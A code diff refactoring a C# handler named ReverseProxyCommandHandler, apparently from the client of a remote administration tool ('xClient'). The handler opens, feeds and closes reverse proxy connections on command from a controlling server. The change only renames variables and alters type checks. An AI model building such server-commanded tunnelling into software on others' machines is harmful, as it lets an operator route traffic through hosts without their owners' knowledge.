@@ -1,38 +1,36 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Text;
-using xClient.Core.Packets;
+﻿using xClient.Core.Packets;
 using xClient.Core.ReverseProxy.Packets;
 
 namespace xClient.Core.ReverseProxy
 {
     public class ReverseProxyCommandHandler
     {
-        public static void HandleCommand(Client client, IPacket Packet)
+        public static void HandleCommand(Client client, IPacket packet)
         {
-            if (Packet as ReverseProxy_Connect != null)
+            var type = packet.GetType();
+
+            if (type == typeof (ReverseProxyConnect))
             {
-                ReverseProxy_Connect ConnectCommand = Packet as ReverseProxy_Connect;
-                client.ConnectReverseProxy(ConnectCommand);
+                client.ConnectReverseProxy((ReverseProxyConnect) packet);
             }
-            else if (Packet as ReverseProxy_Data != null)
+            else if (type == typeof (ReverseProxyData))
             {
-                ReverseProxy_Data DataCommand = Packet as ReverseProxy_Data;
-                ReverseProxyClient proxyClient = client.GetReverseProxyByConnectionId(DataCommand.ConnectionId);
+                ReverseProxyData dataCommand = (ReverseProxyData)packet;
+                ReverseProxyClient proxyClient = client.GetReverseProxyByConnectionId(dataCommand.ConnectionId);
 
                 if (proxyClient != null)
                 {
-                    proxyClient.SendToTargetServer(DataCommand.Data);
+                    proxyClient.SendToTargetServer(dataCommand.Data);
                 }
             }
-            else if (Packet as ReverseProxy_Disconnect != null)
+            else if (type == typeof (ReverseProxyDisconnect))
             {
-                ReverseProxy_Disconnect DisconnectCommand = Packet as ReverseProxy_Disconnect;
-                ReverseProxyClient SocksClient = client.GetReverseProxyByConnectionId(DisconnectCommand.ConnectionId);
+                ReverseProxyDisconnect disconnectCommand = (ReverseProxyDisconnect)packet;
+                ReverseProxyClient socksClient = client.GetReverseProxyByConnectionId(disconnectCommand.ConnectionId);
 
-                if (SocksClient != null)
+                if (socksClient != null)
                 {
-                    SocksClient.Disconnect();
+                    socksClient.Disconnect();
                 }
             }
         }
